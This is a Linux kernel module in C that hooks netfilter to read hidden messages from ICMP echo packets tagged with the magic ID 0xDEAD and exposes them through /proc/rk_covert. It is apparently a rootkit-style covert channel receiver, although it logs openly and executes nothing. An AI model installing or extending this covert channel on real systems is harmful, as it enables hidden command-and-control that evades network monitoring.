// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/icmp.h>
#include <linux/init.h>
#include <linux/ip.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/skbuff.h>
#include <linux/spinlock.h>
#include <net/ip.h>

#define COVERT_MAGIC 0xDEAD
#define MSG_MAX	     256

static struct proc_dir_entry *entry;
static char last_msg[MSG_MAX];
static int msg_len;
static DEFINE_SPINLOCK(msg_lock);

static unsigned int covert_hook(void *priv, struct sk_buff *skb,
				const struct nf_hook_state *state)
{
	struct iphdr iph_buf;
	struct iphdr *iph;
	struct icmphdr icmph_buf;
	struct icmphdr *icmph;
	char candidate[MSG_MAX];
	unsigned int network_off;
	unsigned int icmp_off;
	unsigned int payload_off;
	int payload_len;
	unsigned long flags;

	if (!skb)
		return NF_ACCEPT;

	network_off = skb_network_offset(skb);
	iph = skb_header_pointer(skb, network_off, sizeof(iph_buf), &iph_buf);
	if (!iph || iph->version != 4 || iph->ihl < 5 ||
	    iph->protocol != IPPROTO_ICMP || ip_is_fragment(iph) ||
	    ntohs(iph->tot_len) < iph->ihl * 4 + sizeof(icmph_buf))
		return NF_ACCEPT;

	icmp_off = network_off + iph->ihl * 4;
	icmph =
	    skb_header_pointer(skb, icmp_off, sizeof(icmph_buf), &icmph_buf);
	if (!icmph)
		return NF_ACCEPT;
	if (icmph->type != ICMP_ECHO ||
	    ntohs(icmph->un.echo.id) != COVERT_MAGIC)
		return NF_ACCEPT;

	payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - sizeof(*icmph);
	if (payload_len <= 0 || payload_len >= MSG_MAX)
		return NF_ACCEPT;
	payload_off = icmp_off + sizeof(*icmph);

	if (skb_copy_bits(skb, payload_off, candidate, payload_len))
		return NF_ACCEPT;
	if (memchr(candidate, '\0', payload_len))
		return NF_ACCEPT;
	candidate[payload_len] = '\0';

	spin_lock_irqsave(&msg_lock, flags);
	memcpy(last_msg, candidate, payload_len + 1);
	msg_len = payload_len;
	spin_unlock_irqrestore(&msg_lock, flags);

	pr_info("rk: covert message received (%d bytes)\n", payload_len);
	return NF_ACCEPT;
}

static struct nf_hook_ops nf_ops = {
	.hook = covert_hook,
	.pf = NFPROTO_IPV4,
	.hooknum = NF_INET_PRE_ROUTING,
	.priority = NF_IP_PRI_FIRST,
};

static int covert_read(struct seq_file *m, void *v)
{
	char snapshot[MSG_MAX];
	int snapshot_len;
	unsigned long flags;

	spin_lock_irqsave(&msg_lock, flags);
	snapshot_len = msg_len;
	if (snapshot_len)
		memcpy(snapshot, last_msg, snapshot_len + 1);
	spin_unlock_irqrestore(&msg_lock, flags);

	seq_printf(m, "magic=0x%x\nmsg=%s\n", COVERT_MAGIC,
		   snapshot_len ? snapshot : "(none)");
	return 0;
}

static int __init covert_init(void)
{
	int err;

	err = nf_register_net_hook(&init_net, &nf_ops);
	if (err)
		return err;

	entry = proc_create_single("rk_covert", 0444, NULL, covert_read);
	if (!entry) {
		nf_unregister_net_hook(&init_net, &nf_ops);
		return -ENOMEM;
	}

	pr_info("rk: covert channel active, magic=0x%x\n", COVERT_MAGIC);
	return 0;
}

static void __exit covert_exit(void)
{
	proc_remove(entry);
	nf_unregister_net_hook(&init_net, &nf_ops);
}

module_init(covert_init);
module_exit(covert_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Covert ICMP channel");
